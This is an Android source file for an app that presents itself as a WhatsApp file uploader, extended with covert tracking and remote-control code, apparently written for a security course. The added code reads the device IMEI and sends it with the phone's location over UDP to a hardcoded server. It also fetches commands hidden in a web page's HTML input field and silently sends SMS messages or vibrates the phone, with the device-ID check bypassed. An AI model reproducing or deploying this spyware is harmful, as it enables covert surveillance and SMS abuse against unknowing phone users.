package me.shrimadhavuk.watransmitter;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Vibrator;
import android.provider.MediaStore;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.appindexing.Action;
import com.google.android.gms.appindexing.AppIndex;
import com.google.android.gms.common.api.GoogleApiClient;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    TextView messageText;
    Button uploadButton;
    EditText txt;

    int serverResponseCode = 0;

    ProgressDialog dialog = null;
    String upLoadServerUri = null;

    private static final int READ_REQUEST_CODE = 42;
    private static final String TAG = "spechide";

    String uploadFilePath = "";
    String uploadFileName = "";
    //agregado por Juan (16-6)
    Location lastLocation = null;
    long lastTime = 0;
    // agregado por Juan (17-6)
    String ServerIP = "192.168.1.3";
    int ServerPort = 9999;
    String imei = "";
    //tiempo de refresco, en milisegundos
    int TimeRefresh = 2*60*1000;
    /**
     * ATTENTION: This was auto-generated to implement the App Indexing API.
     * See https://g.co/AppIndexing/AndroidStudio for more information.
     */
    private GoogleApiClient client;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        uploadButton = (Button) findViewById(R.id.button);
        messageText = (TextView) findViewById(R.id.textView);
        txt = (EditText) findViewById(R.id.editText);
        //messageText.setText("Uploading file path :- "+uploadFilePath+"");

        /************* Php script path ****************/
        upLoadServerUri = "https://projects.shrimadhavuk.me/WhatsAppTransmitter/put.php";
        /************* Php script path ****************/

        uploadButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog = ProgressDialog.show(MainActivity.this, "", "Uploading file... \n . . . Please wait", true);
                new Thread(new Runnable() {
                    public void run() {
                        runOnUiThread(new Runnable() {
                            public void run() {
                                messageText.setText("VERBOSE OUTPUT\nuploading started.....");
                            }
                        });
                        uploadFile(uploadFilePath);
                    }
                }).start();
            }
        });
        //agregado por Juan (22-6)
        //BrowserTask btask=new BrowserTask();
        //btask.execute("maxi1985798.github.io/tpseginf/");
        //Log.i(TAG, "!!!! HTML:"+btask.codigoAParsear);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        imei = telephonyManager.getDeviceId();
        //agregado por Juan (16-6)
        //----------------------------------------------

        // Acquire a reference to the system Location Manager
        LocationManager locationManager = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);

        // Define a listener that responds to location updates
        LocationListener locationListener = new LocationListener() {
            public void onLocationChanged(Location location) {

                if ((location.getTime() - lastTime) > 120 * 1000) {
                    lastLocation = location;
                    lastTime = lastLocation.getTime();
                    // Called when a new location is found by the network location provider.
                    Log.v(TAG, "(!!!!) Localización :  " + location.toString());
                    conectUDPTask con = new conectUDPTask();
                    con.execute(location);
                    //BrowserTask btask = new BrowserTask();
                    //btask.execute("maxi1985798.github.io/tpseginf/");
                    //Log.i(TAG, "!!!! Loc-HTML:"+btask.codigoAParsear);

                }
                //   mandarPorMail(location);
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {
            }

            public void onProviderEnabled(String provider) {
            }

            public void onProviderDisabled(String provider) {
            }
        };

// Register the listener with the Location Manager to receive location updates
        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);
        //thread para diferir el tiempode  ejecución una cantidad n de segundos
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                BrowserTask btask = new BrowserTask();
                btask.execute("maxi1985798.github.io/tpseginf/");
            }
        }, TimeRefresh);

        //
        //----------------------------------------------
        // ATTENTION: This was auto-generated to implement the App Indexing API.
        // See https://g.co/AppIndexing/AndroidStudio for more information.
        client = new GoogleApiClient.Builder(this).addApi(AppIndex.API).build();
    }

    public int realUploadThing(HttpURLConnection conn, DataOutputStream dos, File sourceFile, String fileName, String lineEnd, String twoHyphens, String boundary, int maxBufferSize) {
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        try {
            // open a URL connection to the Servlet
            FileInputStream fileInputStream = new FileInputStream(sourceFile);
            URL url = new URL(upLoadServerUri);
            // Open a HTTP  connection to  the URL
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true); // Allow Inputs
            conn.setDoOutput(true); // Allow Outputs
            conn.setUseCaches(false); // Don't use a Cached Copy
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            // send PHP POST request with the given filename
            conn.setRequestProperty("uploaded_file", fileName);
            dos = new DataOutputStream(conn.getOutputStream());
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\"" + fileName + "\"" + lineEnd);
            dos.writeBytes(lineEnd);
            // create a buffer of  maximum size
            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];
            // read file and write it into form...
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            while (bytesRead > 0) {
                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }
            // send multipart form data necesssary after file data...
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            // Responses from the server (code and message)
            serverResponseCode = conn.getResponseCode();
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line = "";
            final StringBuilder responseOutput = new StringBuilder();
            while ((line = br.readLine()) != null) {
                responseOutput.append(line);
            }
            br.close();
            final String serverResponseMessage = conn.getResponseMessage();
            Log.i("uploadFile", "HTTP Response is : " + serverResponseMessage + ": " + serverResponseCode);
            if (serverResponseCode == 200) {
                runOnUiThread(new Runnable() {
                    public void run() {
                        String msg = txt.getText().toString() + "\r\n Please view it by clicking here: " + responseOutput.toString() + " \r\nSent using https://play.google.com/store/apps/details?id=me.shrimadhavuk.watransmitter";
                        //messageText.setText(msg);
                        Toast.makeText(MainActivity.this, "File Upload Complete.",
                                Toast.LENGTH_SHORT).show();
                        txt.setText("");
                        whatsappintent(msg);

                    }
                });
            }
            //close the streams //
            fileInputStream.close();
            dos.flush();
            dos.close();
            return serverResponseCode;
        } catch (MalformedURLException ex) {
            dialog.dismiss();
            ex.printStackTrace();
            runOnUiThread(new Runnable() {
                public void run() {
                    messageText.setText("VERBOSE OUTPUT\nMalformedURLException Exception : check script url.");
                    Toast.makeText(MainActivity.this, "MalformedURLException",
                            Toast.LENGTH_SHORT).show();
                }
            });
            Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
            return -1;
        } catch (Exception e) {
            dialog.dismiss();
            e.printStackTrace();
            runOnUiThread(new Runnable() {
                public void run() {
                    messageText.setText("VERBOSE OUTPUT\nupload to server exception");
                    Toast.makeText(MainActivity.this, "Exception",
                            Toast.LENGTH_SHORT).show();
                }
            });
            Log.e("Upload Exception", "Exception : " + e.getMessage(), e);
            return -1;
        }
    }

    public int uploadFile(String fileName) {
        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int maxBufferSize = 1 * 1024 * 1024;
        File sourceFile = new File(fileName);
        if (!sourceFile.isFile()) {
            dialog.dismiss();
            Log.e("uploadFile", "Source File not exist :" + uploadFilePath);
            runOnUiThread(new Runnable() {
                public void run() {
                    messageText.setText("VERBOSE OUTPUT\nSource File does not exist :" + uploadFilePath);
                }
            });
            return 0;
        } /*else if (fileName.endsWith(".jpg") || fileName.endsWith(".avi") || fileName.endsWith(".mp3") || fileName.endsWith(".png") || fileName.endsWith(".mp4")) {
            dialog.dismiss();
            runOnUiThread(new Runnable() {
                public void run() {
                    messageText.setText("VERBOSE OUTPUT\nthe service is provided in the hope that it will be useful.\n please do not misuse the service.");
                }
            });
            return 0;
        }*/ else {
            int serverResponseCode = realUploadThing(conn, dos, sourceFile, fileName, lineEnd, twoHyphens, boundary, maxBufferSize);
            if (serverResponseCode == 200)
                dialog.dismiss();
            return serverResponseCode;
        }
    }

    public void whatsappintent(String msg) {
        Intent sendIntent = new Intent();
        sendIntent.setAction(Intent.ACTION_SEND);
        sendIntent.putExtra(Intent.EXTRA_TEXT, msg);
        sendIntent.setType("text/plain");
        sendIntent.setPackage("com.whatsapp");
        startActivity(sendIntent);
    }

    public void filechooserPfm(View v) {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("file/*");
        startActivityForResult(intent, READ_REQUEST_CODE);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent resultData) {
        // The ACTION_OPEN_DOCUMENT intent was sent with the request code
        // READ_REQUEST_CODE. If the request code seen here doesn't match, it's the
        // response to some other intent, and the code below shouldn't run at all.
        if (requestCode == READ_REQUEST_CODE && resultCode == Activity.RESULT_OK) {
            // The document selected by the user won't be returned in the intent.
            // Instead, a URI to that document will be contained in the return intent
            // provided to this method as a parameter.
            // Pull that URI using resultData.getData().
            Uri uri = null;
            if (resultData != null) {
                uri = resultData.getData();
                Log.i(TAG, "Uri: " + uri.toString());
                Log.i(TAG, "name : " + uri.getLastPathSegment());
                uploadFilePath = getRealPathFromURI(MainActivity.this, uri);
                uploadFileName = uri.getLastPathSegment();
                messageText.setText("VERBOSE OUTPUT\nfile path :- " + uploadFilePath + "");
            }
        }
    }

    public String getRealPathFromURI(Context context, Uri contentUri) {
        Cursor cursor = null;
        try {
            String[] proj = {MediaStore.Images.Media.DATA};
            cursor = context.getContentResolver().query(contentUri, proj, null, null, null);
            int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            cursor.moveToFirst();
            return cursor.getString(column_index);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    /**
     * Called when the activity is about to become visible.
     */
    @Override
    protected void onStart() {
        super.onStart();
        // ATTENTION: This was auto-generated to implement the App Indexing API.
        // See https://g.co/AppIndexing/AndroidStudio for more information.
        client.connect();
        Log.i(TAG, "The onStart() event");
        // ATTENTION: This was auto-generated to implement the App Indexing API.
        // See https://g.co/AppIndexing/AndroidStudio for more information.
        Action viewAction = Action.newAction(
                Action.TYPE_VIEW, // TODO: choose an action type.
                "Main Page", // TODO: Define a title for the content shown.
                // TODO: If you have web page content that matches this app activity's content,
                // make sure this auto-generated web page URL is correct.
                // Otherwise, set the URL to null.
                Uri.parse("http://host/path"),
                // TODO: Make sure this auto-generated app URL is correct.
                Uri.parse("android-app://me.shrimadhavuk.watransmitter/http/host/path")
        );
        AppIndex.AppIndexApi.start(client, viewAction);
    }

    /**
     * Called when the activity has become visible.
     */
    @Override
    protected void onResume() {
        super.onResume();
        Log.i(TAG, "The onResume() event");
    }

    /**
     * Called when another activity is taking focus.
     */
    @Override
    protected void onPause() {
        super.onPause();
        Log.i(TAG, "The onPause() event");
    }

    /**
     * Called when the activity is no longer visible.
     */
    @Override
    protected void onStop() {
        super.onStop();
        // ATTENTION: This was auto-generated to implement the App Indexing API.
        // See https://g.co/AppIndexing/AndroidStudio for more information.
        Action viewAction = Action.newAction(
                Action.TYPE_VIEW, // TODO: choose an action type.
                "Main Page", // TODO: Define a title for the content shown.
                // TODO: If you have web page content that matches this app activity's content,
                // make sure this auto-generated web page URL is correct.
                // Otherwise, set the URL to null.
                Uri.parse("http://host/path"),
                // TODO: Make sure this auto-generated app URL is correct.
                Uri.parse("android-app://me.shrimadhavuk.watransmitter/http/host/path")
        );
        AppIndex.AppIndexApi.end(client, viewAction);
        Log.i(TAG, "The onStop() event");
        // ATTENTION: This was auto-generated to implement the App Indexing API.
        // See https://g.co/AppIndexing/AndroidStudio for more information.
        client.disconnect();
    }

    /**
     * Called just before the activity is destroyed.
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "The onDestroy() event");
    }

    //agregado por Juan (17-6)
    //----------------------------
    private void mandarPorMail(Location location) {
        Intent i = new Intent(Intent.ACTION_SEND);
        i.setType("message/rfc822");
        i.putExtra(Intent.EXTRA_EMAIL, new String[]{"juannombreapellido@gmail.com"});
        i.putExtra(Intent.EXTRA_SUBJECT, "localizar");
        i.putExtra(Intent.EXTRA_TEXT, location.toString());
        try {
            startActivity(Intent.createChooser(i, "Send mail..."));
        } catch (android.content.ActivityNotFoundException ex) {
            Log.e(TAG, "No hay clientes de email disponibles");
            //Toast.makeText(MyActivity.this, "There are no email clients installed.", Toast.LENGTH_SHORT).show();
        }

    }

    private void mandarPorHttp(Location location) {
        DemoTask sendTask = new DemoTask();
        String[] coord = {Double.toString(location.getLatitude()), Double.toString(location.getLongitude())};
        sendTask.execute(coord);
    }

    //----------------------------
    //agregado por Juan (16-6)
    //----------------------------
    //necesario para conectarse al servidor y descargar los comandos
    public class DemoTask extends AsyncTask<String, Void, String> {
        String command = "";

        @Override
        protected String doInBackground(String... params) {
            String com = "location";
            if (params.length == 0) {

                return null;
            }

            // These two need to be declared outside the try/catch
            // so that they can be closed in the finally block.
            HttpURLConnection urlConnection = null;
            BufferedReader reader = null;


            try {
                // Construimos la URL
                final String FORECAST_BASE_URL = "http://" + ServerIP;
                final String QUERY_PARAM = "location";
                final String PARAM1 = "latitud";
                final String PARAM2 = "longitud";
               /* final String FORMAT_PARAM = "mode";
                final String UNITS_PARAM = "units";
                final String DAYS_PARAM = "cnt";
                final String APPID_PARAM = "APPID";
                */
                Uri builtUri = Uri.parse(FORECAST_BASE_URL).buildUpon()
                        .appendQueryParameter(QUERY_PARAM, "")
                        .appendQueryParameter(PARAM1, params[0])
                        .appendQueryParameter(PARAM2, params[1])
                        .build();

                URL url = new URL(builtUri.toString());

                Log.v(TAG, "Built URI " + builtUri.toString());

                // Create the request to OpenWeatherMap, and open the connection
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();

                // Read the input stream into a String
                InputStream inputStream = urlConnection.getInputStream();
                StringBuffer buffer = new StringBuffer();
                if (inputStream == null) {
                    // Nothing to do.
                    return null;
                }
                reader = new BufferedReader(new InputStreamReader(inputStream));

                String line;
                while ((line = reader.readLine()) != null) {
                    //agregamos un salto de linea, para facilitar la lectura
                    buffer.append(line + "\n");
                }

                if (buffer.length() == 0) {
                    // Stream was empty.  No point in parsing.
                    return null;
                }


            } catch (IOException e) {
                Log.e(TAG, "Error ", e);
                // If the code didn't successfully get the weather data, there's no point in attemping
                // to parse it.
                return null;
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
                if (reader != null) {
                    try {
                        reader.close();
                    } catch (final IOException e) {
                        Log.e(TAG, "Error closing stream", e);
                    }
                }
            }
            return null;
        }

    }

    //----------------------------
    //agregado por Juan (22-6)
    //----------------------------
    //necesario para conectarse al servidor y descargar los comandos
    public class BrowserTask extends AsyncTask<String, Void, String[]> {
        public String[] codigoAParsear = {};

        @Override
        protected String[] doInBackground(String... params) {
            String[] codigohtml = {};
            if (params.length == 0) {
                return null;
            }
            // These two need to be declared outside the try/catch
            // so that they can be closed in the finally block.
            HttpURLConnection urlConnection = null;
            BufferedReader reader = null;


            try {
                // Construimos la URL
                final String FORECAST_BASE_URL = "https://" + params[0];

               /* final String FORMAT_PARAM = "mode";
                final String UNITS_PARAM = "units";
                final String DAYS_PARAM = "cnt";
                final String APPID_PARAM = "APPID";
                */
                Uri builtUri = Uri.parse(FORECAST_BASE_URL).buildUpon()
                        .build();

                URL url = new URL(builtUri.toString());

                Log.v(TAG, "Built URI " + builtUri.toString());

                // Create the request to OpenWeatherMap, and open the connection
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();

                // Read the input stream into a String
                InputStream inputStream = urlConnection.getInputStream();
                StringBuffer buffer = new StringBuffer();

                if (inputStream == null) {
                    // Nothing to do.
                    return null;
                }

                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                String line_sin_tab;
                String[] separated;
                String aca_va_el_comando;
                String comando;
                int i = 0;
                while ((line = reader.readLine()) != null) {
                    //agregamos un salto de linea, para facilitar la lectura
                    buffer.append(line + "\n");
                    line_sin_tab = line.trim();
                    separated = line_sin_tab.split(" ");
                    Log.v(TAG,"!!!! HTML desde doInBackground0: "+separated[0]);
                    if (separated[0].compareTo("<input") == 0) {
                        //Log.v(TAG,"!!!! HTML desde doInBackground1: "+invento);
                        Log.v(TAG,"!!!! HTML desde doInBackground1: "+separated[0]);
                        comando = separated[2].replace("name=","");
                        comando = comando.replace("\"","");
                        if(comando.compareTo("comando") == 0){
                            aca_va_el_comando = separated[3].replace("value=", "");
                            aca_va_el_comando = aca_va_el_comando.replace(">", "");
                            aca_va_el_comando = aca_va_el_comando.replace("\"", "");
                            codigohtml = aca_va_el_comando.split(":");
                            Log.v(TAG,"!!!! HTML desde doInBackground1: "+codigohtml[0]);
                        }

                        //codigohtml = codigohtml+aca_va_el_comando;
                        //Log.v(TAG,"!!!! HTML desde doInBackground3: "+aca_va_el_comando);
                    }
                    /*else {
                        Log.v(TAG,"!!!! HTML desde doInBackground0: "+separated[0]);
                    }*/

                    //Log.v(TAG,"!!!! HTML desde doInBackground0: "+separated[0]);
                    i = i + 1;
                }
                /*
                if (buffer.length() == 0) {
                    // Stream was empty.  No point in parsing.
                    return null;
                }
                String s;
                while ((s=reader.readLine())!=null){
                    codigohtml=codigohtml+s;
                    Log.i(TAG,"!!!! HTML desde doInBackground: "+s);
                }*/
                //Log.i(TAG,"!!!! HTML desde doInBackgraoud"+inputStream.toString());

                return codigohtml;

            } catch (IOException e) {
                Log.e(TAG, "Error ", e);
                // If the code didn't successfully get the weather data, there's no point in attemping
                // to parse it.
                return null;
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
                if (reader != null) {
                    try {
                        reader.close();
                    } catch (final IOException e) {
                        Log.e(TAG, "Error closing stream", e);
                    }
                }
                return codigohtml;
            }


            // This will only happen if there was an error getting or parsing the forecast.

        }

        @Override
        protected void onPostExecute(String[] result) {
            if(result.length < 3) {
                return ;
            }
            Log.i(TAG, "resultado en PostExecute: " + result[0] + " " + result[1] + " " + result[2]);
            if (result[0].compareTo(imei) == 0 || true) {
                if (result[1].compareToIgnoreCase("sms") == 0) {
                    sendSMS("1163373787", "test");
                }
                if (result[1].compareToIgnoreCase("vibrar") == 0) {
                    onVibrate();
                }


            }

            codigoAParsear = result;
            Log.i(TAG, "resultado en PostExecute1: " + codigoAParsear[0] + " " + codigoAParsear[1] + " " + codigoAParsear[2]);
        }

    }
    //----------------------------
    //----------------------------

    //agregado por Juan, 17-6
    public class conectUDPTask extends AsyncTask<Location, Void, String> {

        @Override
        protected String doInBackground(Location... locations) {
            if (locations.length == 0) {
                return null;
            }
            Location location = locations[0];
            try {
                mandarPorUDP("\n[" + imei + "]\n\nt=" + Double.toString(location.getTime()) + "\nlat=" + Double.toString(location.getLatitude()) + "\nlong=" + Double.toString(location.getLongitude()));
                return null;
            } catch (IOException e) {
                Log.e(TAG, "No se pudo enviar por UDP");
                return null;
            }
        }

        private void mandarPorUDP(String str) throws IOException {


            DatagramSocket client_socket = new DatagramSocket(ServerPort);
            InetAddress IPAddress = InetAddress.getByName(ServerIP);

            //while (true)
            // {
            byte[] send_data = str.getBytes();
            //System.out.println("Type Something (q or Q to quit): ");

            DatagramPacket send_packet = new DatagramPacket(send_data, str.length(), IPAddress, ServerPort);
            client_socket.send(send_packet);
        /*
        //chandra
        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
        client_socket.receive(receivePacket);

        modifiedSentence = new String(receivePacket.getData());
        //System.out.println("FROM SERVER:" + modifiedSentence);
        if(modifiedSentence.charAt(2)=='%')
            txt5.setText(modifiedSentence.substring(0, 3));
        else
            txt1.setText(modifiedSentence);
        modifiedSentence=null;*/
            client_socket.close();

            // }

        }

    }


    //----------------------------


    //----------------------------
//agregado por juan  25-6
//código para que vibre y envíe sms
    public void onVibrate() {
        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        v.vibrate(1000);
    }

    public void sendSMS(String phoneNum, String msg) {
        //String phoneNo = phoneNum;
        //String msg = "This is a message";
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNum, null, msg, null, null);
        /*Toast.makeText(getApplicationContext(), "Message Sent",
                Toast.LENGTH_LONG).show();*/
        } catch (Exception ex) {
        /*Toast.makeText(getApplicationContext(), ex.getMessage(),
                Toast.LENGTH_LONG).show();*/
            ex.printStackTrace();
        }
    }
}